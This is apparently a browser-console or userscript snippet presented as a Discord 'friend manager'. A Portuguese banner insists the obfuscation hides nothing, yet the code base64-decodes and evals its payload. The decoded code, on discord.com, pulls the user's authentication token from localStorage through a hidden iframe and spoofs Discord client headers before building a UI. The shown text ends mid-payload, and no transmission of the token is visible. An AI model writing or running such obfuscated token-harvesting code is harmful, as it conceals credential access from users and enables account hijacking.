/////////////////////////////////////////////////////
// SIM! O código está ofuscado, mas tem um motivo! //
// Não é para esconder nada, e sim dificultar      //
// a associação a certas empresas.                 //
/////////////////////////////////////////////////////

(function(base64Input){
    const decodedText = new TextDecoder("utf-8").decode(
        Uint8Array.from(atob(base64Input), char => char.charCodeAt(0))
    );
    eval(decodedText);
})("KGFzeW5jICgpID0+IHsKICAgIGlmICghd2luZG93LmxvY2F0aW9uLmhvc3RuYW1lLmluY2x1ZGVzKCdkaXNjb3JkLmNvbScpKSByZXR1cm47CiAgICBpZiAoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Rpc2NvcmQtZnJpZW5kLW1hbmFnZXInKSkgcmV0dXJuOwoKICAgIGNvbnN0IGdldFRva2VuID0gKCkgPT4gewogICAgICAgIGNvbnN0IGlmcmFtZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lmcmFtZScpOwogICAgICAgIGlmcmFtZS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOwogICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoaWZyYW1lKTsKICAgICAgICBjb25zdCB0b2tlbiA9IGlmcmFtZS5jb250ZW50V2luZG93LmxvY2FsU3RvcmFnZS5nZXRJdGVtKCd0b2tlbicpPy5yZXBsYWNlKC8iL2csICcnKTsKICAgICAgICBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKGlmcmFtZSk7CiAgICAgICAgcmV0dXJuIHRva2VuOwogICAgfTsKCiAgICBjb25zdCB0b2tlbiA9IGdldFRva2VuKCk7CiAgICBsZXQgcmVxdWVzdERlbGF5ID0gMTAwMDsKICAgIGNvbnN0IHhTdXBlclByb3BlcnRpZXMgPSAnZXlKdmN5STZJbGRwYm1SdmQzTWlMQ0ppY205M2MyVnlJam9pUTJoeWIyMWxJaXdpWkdWMmFXTmxJam9pSWl3aWMzbHpkR1Z0WDJ4dlkyRnNaU0k2SW5CMExVSlNJaXdpYUdGelgyTnNhV1Z1ZEY5dGIyUnpJanBtWVd4elpTd2lZbkp2ZDNObGNsOTFjMlZ5WDJGblpXNTBJam9pVFc5NmFXeHNZUzgxTGpBZ0tGZHBibVJ2ZDNNZ1RsUWdNVEF1TURzZ1YybHVOalE3SUhnMk5Da2dRWEJ3YkdWWFpXSkxhWFF2TlRNM0xqTTJJQ2hMU0ZSTlRDd2diR2xyWlNCSFpXTnJieWtnUTJoeWIyMWxMekV5TUM0d0xqQXVNQ0JUWVdaaGNta3ZOVE0zTGpNMklpd2lZbkp2ZDNObGNsOTJaWEp6YVc5dUlqb2lNVEl3TGpBdU1DNHdJaXdpYjNOZmRtVnljMmx2YmlJNklqRXdJaXdpY21WbVpYSnlaWElpT2lJaUxDSnlaV1psY25KcGJtZGZaRzl0WVdsdUlqb2lJaXdpY21Wc1pXRnpaVjlqYUdGdWJtVnNJam9pYzNSaFlteGxJaXdpWTJ4cFpXNTBYMkoxYVd4a1gyNTFiV0psY2lJNk9UazVPVGs1TENKamJHbGxiblJmWlhabGJuUmZjMjkxY21ObElqcHVkV3hzZlE9PSc7CiAgICBjb25zdCBub3RpZmljYXRpb25RdWV1ZSA9IFtdOwogICAgbGV0IGFjdGl2ZU5vdGlmaWNhdGlvbnMgPSAwOwoKICAgIGNvbnN0IHN0eWxlID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc3R5bGUnKTsKICAgIHN0eWxlLnRleHRDb250ZW50ID0gYAogICAgICAgIEBrZXlmcmFtZXMgc2xpZGVJblJpZ2h0IHsKICAgICAgICAgICAgZnJvbSB7IHRyYW5zZm9ybTogdHJhbnNsYXRlWCg0MDBweCk7IG9wYWNpdHk6IDA7IH0KICAgICAgICAgICAgdG8geyB0cmFuc2Zvcm06IHRyYW5zbGF0ZVgoMCk7IG9wYWNpdHk6IDE7IH0KICAgICAgICB9CgogICAgICAgIEBrZXlmcmFtZXMgc2xpZGVPdXRSaWdodCB7CiAgICAgICAgICAgIGZyb20geyB0cmFuc2Zvcm06IHRyYW5zbGF0ZVgoMCk7IG9wYWNpdHk6IDE7IH0KICAgICAgICAgICAgdG8geyB0cmFuc2Zvcm06IHRyYW5zbGF0ZVgoNDAwcHgpOyBvcGFjaXR5OiAwOyB9CiAgICAgICAgfQoKICAgICAgICBAa2V5ZnJhbWVzIGZhZGVJbiB7CiAgICAgICAgICAgIGZyb20geyBvcGFjaXR5OiAwOyB0cmFuc2Zvcm06IHNjYWxlKDAuOTUpOyB9CiAgICAgICAgICAgIHRvIHsgb3BhY2l0eTogMTsgdHJhbnNmb3JtOiBzY2FsZSgxKTsgfQogICAgICAgIH0KCiAgICAgICAgQGtleWZyYW1lcyBmYWRlT3V0IHsKICAgICAgICAgICAgZnJvbSB7IG9wYWNpdHk6IDE7IHRyYW5zZm9ybTogc2NhbGUoMSk7IH0KICAgICAgICAgICAgdG8geyBvcGFjaXR5OiAwOyB0cmFuc2Zvcm06IHNjYWxlKDAuOTUpOyB9CiAgICAgICAgfQoKICAgICAgICBAa2V5ZnJhbWVzIG1vZGFsRmFkZUluIHsKICAgICAgICAgICAgZnJvbSB7IG9wYWNpdHk6IDA7IHRyYW5zZm9ybTogc2NhbGUoMC45NSk7IH0KICAgICAgICAgICAgdG8geyBvcGFjaXR5OiAxOyB0cmFuc2Zvcm06IHNjYWxlKDEpOyB9CiAgICAgICAgfQoKICAgICAgICBAa2V5ZnJhbWVzIHNoaW1tZXIgewogICAgICAgICAgICAwJSB7IGJhY2tncm91bmQtcG9zaXRpb246IC0yMDAlIDA7IH0KICAgICAgICAgICAgMTAwJSB7IGJhY2tncm91bmQtcG9zaXRpb246IDIwMCUgMDsgfQogICAgICAgIH0KCiAgICAgICAgQGtleWZyYW1lcyBkb3RzIHsKICAgICAgICAgICAgMCUsIDIwJSB7IGNvbnRlbnQ6ICcuJzsgfQogICAgICAgICAgICA0MCUgeyBjb250ZW50OiAnLi4nOyB9CiAgICAgICAgICAgIDYwJSwgMTAwJSB7IGNvbnRlbnQ6ICcuLi4nOyB9CiAgICAgICAgfQoKICAgICAgICAjZGlzY29yZC1mcmllbmQtbWFuYWdlciwKICAgICAgICAjZGlzY29yZC1mcmllbmQtbWFuYWdlciAqLAogICAgICAgICNkaXNjb3JkLWZyaWVuZC1tYW5hZ2VyICo6OmJlZm9yZSwKICAgICAgICAjZGlzY29yZC1mcmllbmQtbWFuYWdlciAqOjphZnRlciwKICAgICAgICAuZGZtLW1vZGFsLAogICAgICAgIC5kZm0tbW9kYWwgKiwKICAgICAgICAuZGZtLXNldHRpbmdzLW1vZGFsLAogICAgICAgIC5kZm0tc2V0dGluZ3MtbW9kYWwgKiwKICAgICAgICAjZGZtLW5vdGlmaWNhdGlvbi1jb250YWluZXIsCiAgICAgICAgI2RmbS1ub3RpZmljYXRpb24tY29udGFpbmVyICogewogICAgICAgICAgICBib3gtc2l6aW5nOiBib3JkZXItYm94ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGZvbnQtZmFtaWx5OiAnZ2cgc2FucycsICdOb3RvIFNhbnMnLCAnSGVsdmV0aWNhIE5ldWUnLCBIZWx2ZXRpY2EsIEFyaWFsLCBzYW5zLXNlcmlmICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAjZGlzY29yZC1mcmllbmQtbWFuYWdlciB7CiAgICAgICAgICAgIHBvc2l0aW9uOiBmaXhlZCAhaW1wb3J0YW50OwogICAgICAgICAgICBkaXNwbGF5OiBub25lICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIHdpZHRoOiA3MDBweCAhaW1wb3J0YW50OwogICAgICAgICAgICBtYXgtd2lkdGg6IGNhbGMoMTAwdncgLSA0MHB4KSAhaW1wb3J0YW50OwogICAgICAgICAgICBoZWlnaHQ6IDYwMHB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIG1heC1oZWlnaHQ6IGNhbGMoMTAwdmggLSA0MHB4KSAhaW1wb3J0YW50OwogICAgICAgICAgICBiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoMTQ1ZGVnLCAjMGYwZjBmIDAlLCAjMWExYTFhIDEwMCUpICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDEycHggIWltcG9ydGFudDsKICAgICAgICAgICAgei1pbmRleDogOTk5OTk5ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW4gIWltcG9ydGFudDsKICAgICAgICAgICAgb3ZlcmZsb3c6IGhpZGRlbiAhaW1wb3J0YW50OwogICAgICAgICAgICBib3gtc2hhZG93OiAwIDhweCAzMnB4IHJnYmEoMCwgMCwgMCwgMC41KSAhaW1wb3J0YW50OwogICAgICAgICAgICBib3JkZXI6IDFweCBzb2xpZCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMSkgIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgICNkaXNjb3JkLWZyaWVuZC1tYW5hZ2VyLnZpc2libGUgewogICAgICAgICAgICBkaXNwbGF5OiBmbGV4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGFuaW1hdGlvbjogZmFkZUluIDAuMjVzIGVhc2UgZm9yd2FyZHMgIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgICNkaXNjb3JkLWZyaWVuZC1tYW5hZ2VyLmNsb3NpbmcgewogICAgICAgICAgICBkaXNwbGF5OiBmbGV4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGFuaW1hdGlvbjogZmFkZU91dCAwLjI1cyBlYXNlIGZvcndhcmRzICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLWhlYWRlciB7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCgxMzVkZWcsICMxYTFhMWEgMCUsICMxNDE0MTQgMTAwJSkgIWltcG9ydGFudDsKICAgICAgICAgICAgcGFkZGluZzogMTZweCAyMHB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGJvcmRlci1ib3R0b206IDFweCBzb2xpZCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMDgpICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGRpc3BsYXk6IGZsZXggIWltcG9ydGFudDsKICAgICAgICAgICAganVzdGlmeS1jb250ZW50OiBjZW50ZXIgIWltcG9ydGFudDsKICAgICAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlciAhaW1wb3J0YW50OwogICAgICAgICAgICBjdXJzb3I6IG1vdmUgIWltcG9ydGFudDsKICAgICAgICAgICAgdXNlci1zZWxlY3Q6IG5vbmUgIWltcG9ydGFudDsKICAgICAgICAgICAgcG9zaXRpb246IHJlbGF0aXZlICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGZsZXgtc2hyaW5rOiAwICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIG1pbi1oZWlnaHQ6IDU2cHggIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgIC5kZm0taGVhZGVyOjpiZWZvcmUgewogICAgICAgICAgICBjb250ZW50OiAnJyAhaW1wb3J0YW50OwogICAgICAgICAgICBwb3NpdGlvbjogYWJzb2x1dGUgIWltcG9ydGFudDsKICAgICAgICAgICAgdG9wOiAwICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGxlZnQ6IDAgIWltcG9ydGFudDsKICAgICAgICAgICAgd2lkdGg6IDEwMCUgIWltcG9ydGFudDsKICAgICAgICAgICAgaGVpZ2h0OiAxMDAlICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCg5MGRlZywgdHJhbnNwYXJlbnQsIHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4wMyksIHRyYW5zcGFyZW50KSAhaW1wb3J0YW50OwogICAgICAgICAgICBiYWNrZ3JvdW5kLXNpemU6IDIwMCUgMTAwJSAhaW1wb3J0YW50OwogICAgICAgICAgICBhbmltYXRpb246IHNoaW1tZXIgM3MgZWFzZS1pbi1vdXQgaW5maW5pdGUgIWltcG9ydGFudDsKICAgICAgICAgICAgcG9pbnRlci1ldmVudHM6IG5vbmUgIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgIC5kZm0tdGl0bGUgewogICAgICAgICAgICBjb2xvcjogI2ZmZmZmZiAhaW1wb3J0YW50OwogICAgICAgICAgICBmb250LXNpemU6IDE2cHggIWltcG9ydGFudDsKICAgICAgICAgICAgZm9udC13ZWlnaHQ6IDcwMCAhaW1wb3J0YW50OwogICAgICAgICAgICBsZXR0ZXItc3BhY2luZzogLTAuM3B4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlciAhaW1wb3J0YW50OwogICAgICAgICAgICBtYXJnaW46IDAgIWltcG9ydGFudDsKICAgICAgICAgICAgcGFkZGluZzogMCAhaW1wb3J0YW50OwogICAgICAgIH0KCiAgICAgICAgLmRmbS1jb250cm9scyB7CiAgICAgICAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZSAhaW1wb3J0YW50OwogICAgICAgICAgICByaWdodDogMTZweCAhaW1wb3J0YW50OwogICAgICAgICAgICB0b3A6IDUwJSAhaW1wb3J0YW50OwogICAgICAgICAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZVkoLTUwJSkgIWltcG9ydGFudDsKICAgICAgICAgICAgZGlzcGxheTogZmxleCAhaW1wb3J0YW50OwogICAgICAgICAgICBnYXA6IDhweCAhaW1wb3J0YW50OwogICAgICAgIH0KCiAgICAgICAgLmRmbS1idG4taWNvbiB7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4wNikgIWltcG9ydGFudDsKICAgICAgICAgICAgYm9yZGVyOiAxcHggc29saWQgcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjEpICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGNvbG9yOiAjYjBiMGIwICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGN1cnNvcjogcG9pbnRlciAhaW1wb3J0YW50OwogICAgICAgICAgICB3aWR0aDogMzJweCAhaW1wb3J0YW50OwogICAgICAgICAgICBoZWlnaHQ6IDMycHggIWltcG9ydGFudDsKICAgICAgICAgICAgbWluLXdpZHRoOiAzMnB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIG1pbi1oZWlnaHQ6IDMycHggIWltcG9ydGFudDsKICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogNnB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIHRyYW5zaXRpb246IGFsbCAwLjE1cyBlYXNlICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMTZweCAhaW1wb3J0YW50OwogICAgICAgICAgICBkaXNwbGF5OiBmbGV4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGFsaWduLWl0ZW1zOiBjZW50ZXIgIWltcG9ydGFudDsKICAgICAgICAgICAganVzdGlmeS1jb250ZW50OiBjZW50ZXIgIWltcG9ydGFudDsKICAgICAgICAgICAgcGFkZGluZzogMCAhaW1wb3J0YW50OwogICAgICAgICAgICBtYXJnaW46IDAgIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgIC5kZm0tYnRuLWljb246aG92ZXIgewogICAgICAgICAgICBiYWNrZ3JvdW5kOiByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMSkgIWltcG9ydGFudDsKICAgICAgICAgICAgY29sb3I6ICNmZmZmZmYgIWltcG9ydGFudDsKICAgICAgICAgICAgYm9yZGVyLWNvbG9yOiByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMTUpICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLWJ0bi1pY29uOmFjdGl2ZSB7CiAgICAgICAgICAgIHRyYW5zZm9ybTogc2NhbGUoMC45MikgIWltcG9ydGFudDsKICAgICAgICAgICAgb3BhY2l0eTogMC44ICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLXRhYnMgewogICAgICAgICAgICBkaXNwbGF5OiBmbGV4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGJhY2tncm91bmQ6ICMxNDE0MTQgIWltcG9ydGFudDsKICAgICAgICAgICAgYm9yZGVyLWJvdHRvbTogMXB4IHNvbGlkIHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4wOCkgIWltcG9ydGFudDsKICAgICAgICAgICAgZmxleC1zaHJpbms6IDAgIWltcG9ydGFudDsKICAgICAgICAgICAgcGFkZGluZzogMCAhaW1wb3J0YW50OwogICAgICAgICAgICBtYXJnaW46IDAgIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgIC5kZm0tdGFiIHsKICAgICAgICAgICAgZmxleDogMSAhaW1wb3J0YW50OwogICAgICAgICAgICBwYWRkaW5nOiAxNHB4IDIwcHggIWltcG9ydGFudDsKICAgICAgICAgICAgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQgIWltcG9ydGFudDsKICAgICAgICAgICAgYm9yZGVyOiBub25lICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGNvbG9yOiAjODg4ODg4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMTRweCAhaW1wb3J0YW50OwogICAgICAgICAgICBmb250LXdlaWdodDogNjAwICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGN1cnNvcjogcG9pbnRlciAhaW1wb3J0YW50OwogICAgICAgICAgICB0cmFuc2l0aW9uOiBhbGwgMC4ycyBlYXNlICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlciAhaW1wb3J0YW50OwogICAgICAgICAgICBwb3NpdGlvbjogcmVsYXRpdmUgIWltcG9ydGFudDsKICAgICAgICAgICAgbWFyZ2luOiAwICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLXRhYjo6YWZ0ZXIgewogICAgICAgICAgICBjb250ZW50OiAnJyAhaW1wb3J0YW50OwogICAgICAgICAgICBwb3NpdGlvbjogYWJzb2x1dGUgIWltcG9ydGFudDsKICAgICAgICAgICAgYm90dG9tOiAwICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGxlZnQ6IDUwJSAhaW1wb3J0YW50OwogICAgICAgICAgICB3aWR0aDogMCAhaW1wb3J0YW50OwogICAgICAgICAgICBoZWlnaHQ6IDJweCAhaW1wb3J0YW50OwogICAgICAgICAgICBiYWNrZ3JvdW5kOiAjNTg2NWYyICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIHRyYW5zaXRpb246IGFsbCAwLjJzIGVhc2UgIWltcG9ydGFudDsKICAgICAgICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVYKC01MCUpICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLXRhYjpob3ZlciB7CiAgICAgICAgICAgIGNvbG9yOiAjY2NjY2NjICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4wMykgIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgIC5kZm0tdGFiLmFjdGl2ZSB7CiAgICAgICAgICAgIGNvbG9yOiAjNTg2NWYyICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IHJnYmEoODgsIDEwMSwgMjQyLCAwLjA4KSAhaW1wb3J0YW50OwogICAgICAgIH0KCiAgICAgICAgLmRmbS10YWIuYWN0aXZlOjphZnRlciB7CiAgICAgICAgICAgIHdpZHRoOiAxMDAlICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGxlZnQ6IDAgIWltcG9ydGFudDsKICAgICAgICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVYKDApICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLWNvbnRlbnQgewogICAgICAgICAgICBmbGV4OiAxICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIG92ZXJmbG93LXk6IGF1dG8gIWltcG9ydGFudDsKICAgICAgICAgICAgb3ZlcmZsb3cteDogaGlkZGVuICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGJhY2tncm91bmQ6ICMwZjBmMGYgIWltcG9ydGFudDsKICAgICAgICAgICAgc2Nyb2xsYmFyLXdpZHRoOiB0aGluICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIHNjcm9sbGJhci1jb2xvcjogcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjE1KSB0cmFuc3BhcmVudCAhaW1wb3J0YW50OwogICAgICAgIH0KCiAgICAgICAgLmRmbS1jb250ZW50Ojotd2Via2l0LXNjcm9sbGJhciB7CiAgICAgICAgICAgIHdpZHRoOiA4cHggIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgIC5kZm0tY29udGVudDo6LXdlYmtpdC1zY3JvbGxiYXItdHJhY2sgewogICAgICAgICAgICBiYWNrZ3JvdW5kOiB0cmFuc3BhcmVudCAhaW1wb3J0YW50OwogICAgICAgIH0KCiAgICAgICAgLmRmbS1jb250ZW50Ojotd2Via2l0LXNjcm9sbGJhci10aHVtYiB7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4xNSkgIWltcG9ydGFudDsKICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogNHB4ICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLWNvbnRlbnQ6Oi13ZWJraXQtc2Nyb2xsYmFyLXRodW1iOmhvdmVyIHsKICAgICAgICAgICAgYmFja2dyb3VuZDogcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjI1KSAhaW1wb3J0YW50OwogICAgICAgIH0KCiAgICAgICAgLmRmbS10YWItY29udGVudCB7CiAgICAgICAgICAgIGRpc3BsYXk6IG5vbmUgIWltcG9ydGFudDsKICAgICAgICAgICAgcGFkZGluZzogMjBweCAhaW1wb3J0YW50OwogICAgICAgIH0KCiAgICAgICAgLmRmbS10YWItY29udGVudC5hY3RpdmUgewogICAgICAgICAgICBkaXNwbGF5OiBibG9jayAhaW1wb3J0YW50OwogICAgICAgIH0KCiAgICAgICAgLmRmbS1zZWFyY2gtY29udGFpbmVyIHsKICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogMTZweCAhaW1wb3J0YW50OwogICAgICAgIH0KCiAgICAgICAgLmRmbS1zZWFyY2ggewogICAgICAgICAgICB3aWR0aDogMTAwJSAhaW1wb3J0YW50OwogICAgICAgICAgICBwYWRkaW5nOiAxMnB4IDE2cHggIWltcG9ydGFudDsKICAgICAgICAgICAgYmFja2dyb3VuZDogcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjA2KSAhaW1wb3J0YW50OwogICAgICAgICAgICBib3JkZXI6IDFweCBzb2xpZCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMSkgIWltcG9ydGFudDsKICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogOHB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGNvbG9yOiAjZmZmZmZmICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMTRweCAhaW1wb3J0YW50OwogICAgICAgICAgICB0cmFuc2l0aW9uOiBhbGwgMC4ycyBlYXNlICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIG91dGxpbmU6IG5vbmUgIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgIC5kZm0tc2VhcmNoOjpwbGFjZWhvbGRlciB7CiAgICAgICAgICAgIGNvbG9yOiAjNjY2NjY2ICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLXNlYXJjaDpmb2N1cyB7CiAgICAgICAgICAgIGJvcmRlci1jb2xvcjogIzU4NjVmMiAhaW1wb3J0YW50OwogICAgICAgICAgICBiYWNrZ3JvdW5kOiByZ2JhKDg4LCAxMDEsIDI0MiwgMC4xKSAhaW1wb3J0YW50OwogICAgICAgICAgICBib3gtc2hhZG93OiAwIDAgMCAycHggcmdiYSg4OCwgMTAxLCAyNDIsIDAuMikgIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgIC5kZm0tYWN0aW9ucyB7CiAgICAgICAgICAgIGRpc3BsYXk6IGZsZXggIWltcG9ydGFudDsKICAgICAgICAgICAgZ2FwOiAxMHB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIG1hcmdpbi1ib3R0b206IDE2cHggIWltcG9ydGFudDsKICAgICAgICAgICAgZmxleC13cmFwOiB3cmFwICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLWFjdGlvbnMgLmRmbS1idG4gewogICAgICAgICAgICBmbGV4OiAxICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIG1pbi13aWR0aDogMTQwcHggIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgIC5kZm0tYnRuIHsKICAgICAgICAgICAgYmFja2dyb3VuZDogbGluZWFyLWdyYWRpZW50KDEzNWRlZywgIzU4NjVmMiAwJSwgIzQ3NTJjNCAxMDAlKSAhaW1wb3J0YW50OwogICAgICAgICAgICBjb2xvcjogI2ZmZmZmZiAhaW1wb3J0YW50OwogICAgICAgICAgICBib3JkZXI6IG5vbmUgIWltcG9ydGFudDsKICAgICAgICAgICAgcGFkZGluZzogMTJweCAyMHB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDhweCAhaW1wb3J0YW50OwogICAgICAgICAgICBmb250LXNpemU6IDE0cHggIWltcG9ydGFudDsKICAgICAgICAgICAgZm9udC13ZWlnaHQ6IDYwMCAhaW1wb3J0YW50OwogICAgICAgICAgICBjdXJzb3I6IHBvaW50ZXIgIWltcG9ydGFudDsKICAgICAgICAgICAgdHJhbnNpdGlvbjogYWxsIDAuMTVzIGVhc2UgIWltcG9ydGFudDsKICAgICAgICAgICAgdGV4dC1hbGlnbjogY2VudGVyICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIHdoaXRlLXNwYWNlOiBub3dyYXAgIWltcG9ydGFudDsKICAgICAgICAgICAgbWFyZ2luOiAwICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLWJ0bjpob3ZlciB7CiAgICAgICAgICAgIGZpbHRlcjogYnJpZ2h0bmVzcygxLjEpICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWSgtMXB4KSAhaW1wb3J0YW50OwogICAgICAgICAgICBib3gtc2hhZG93OiAwIDRweCAxMnB4IHJnYmEoODgsIDEwMSwgMjQyLCAwLjQpICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLWJ0bjphY3RpdmUgewogICAgICAgICAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZVkoMCkgIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgIC5kZm0tYnRuLnNlY29uZGFyeSB7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCgxMzVkZWcsICMzYTNhM2EgMCUsICMyYTJhMmEgMTAwJSkgIWltcG9ydGFudDsKICAgICAgICAgICAgYm9yZGVyOiAxcHggc29saWQgcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjEpICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLWJ0bi5zZWNvbmRhcnk6aG92ZXIgewogICAgICAgICAgICBiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoMTM1ZGVnLCAjNDQ0NDQ0IDAlLCAjMzMzMzMzIDEwMCUpICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGJveC1zaGFkb3c6IDAgNHB4IDEycHggcmdiYSgwLCAwLCAwLCAwLjQpICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLWJ0bi5kYW5nZXIgewogICAgICAgICAgICBiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoMTM1ZGVnLCAjZWQ0MjQ1IDAlLCAjYzAzNTM3IDEwMCUpICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLWJ0bi5kYW5nZXI6aG92ZXIgewogICAgICAgICAgICBib3gtc2hhZG93OiAwIDRweCAxMnB4IHJnYmEoMjM3LCA2NiwgNjksIDAuNCkgIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgIC5kZm0tYnRuOmRpc2FibGVkIHsKICAgICAgICAgICAgb3BhY2l0eTogMC41ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGN1cnNvcjogbm90LWFsbG93ZWQgIWltcG9ydGFudDsKICAgICAgICAgICAgdHJhbnNmb3JtOiBub25lICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIHBvaW50ZXItZXZlbnRzOiBub25lICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLWZyaWVuZCwKICAgICAgICAuZGZtLXNlcnZlciB7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4wNCkgIWltcG9ydGFudDsKICAgICAgICAgICAgcGFkZGluZzogMTJweCAxNnB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDhweCAhaW1wb3J0YW50OwogICAgICAgICAgICBtYXJnaW4tYm90dG9tOiA4cHggIWltcG9ydGFudDsKICAgICAgICAgICAgZGl